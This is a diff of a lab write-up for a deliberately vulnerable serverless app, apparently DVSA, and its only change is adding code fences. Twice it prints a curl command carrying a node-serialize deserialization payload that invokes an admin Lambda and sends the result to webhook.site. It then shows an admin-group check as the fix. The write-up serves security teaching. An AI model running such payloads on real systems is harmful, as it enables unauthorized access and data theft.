@@ -15,11 +15,13 @@ You have to follow these steps:
 5. Search for API Gateway and open it.
 6. Open the DVSA API and copy the Invoke URL.
 7. Replace `[Your_Code]` and `[YOUR_WEBHOOK_ID]` in the following command, then run it in the terminal:
+```bash
 
 curl -s -X POST "https://[Your_Code].execute-api.us-east-1.amazonaws.com/dvsa/order" \
 -H 'Content-Type: application/json' \
 -H 'Authorization: Bearer dummy' \
 -d '{"action": "_$$ND_FUNC$$_function(){var {Lambda}=require(\"@aws-sdk/client-lambda\");var lambda=new Lambda({});lambda.invoke({FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",Payload:Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"04\"}))}).then(d=>{var p=Buffer.from(d.Payload).toString();require(\"https\").get(\"https://webhook.site/[YOUR_WEBHOOK_ID]/?data=\"+encodeURIComponent(p));}).catch(e=>{console.error(\"ERR\",e)});}()", "cart-id":""}'
+```
 
 8. After running the command, observe the incoming request on Webhook.site.
 
@@ -53,12 +55,12 @@ if "admin" not in groups:
 This fix ensures that only users in the admin group can invoke the receipt-generation function.
 
 To verify that the fix is working, run the same curl command again:
-
+```bash
 curl -s -X POST "https://[Your_Code].execute-api.us-east-1.amazonaws.com/dvsa/order" \
 -H 'Content-Type: application/json' \
 -H 'Authorization: Bearer dummy' \
 -d '{"action": "_$$ND_FUNC$$_function(){var {Lambda}=require(\"@aws-sdk/client-lambda\");var lambda=new Lambda({});lambda.invoke({FunctionName:\"DVSA-ADMIN-GET-RECEIPT\",Payload:Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"04\"}))}).then(d=>{var p=Buffer.from(d.Payload).toString();require(\"https\").get(\"https://webhook.site/[YOUR_WEBHOOK_ID]/?data=\"+encodeURIComponent(p));}).catch(e=>{console.error(\"ERR\",e)});}()", "cart-id":""}'
-
+```
 After applying the fix, the application will return:
 
 {"status":"error","message":"Access denied"}
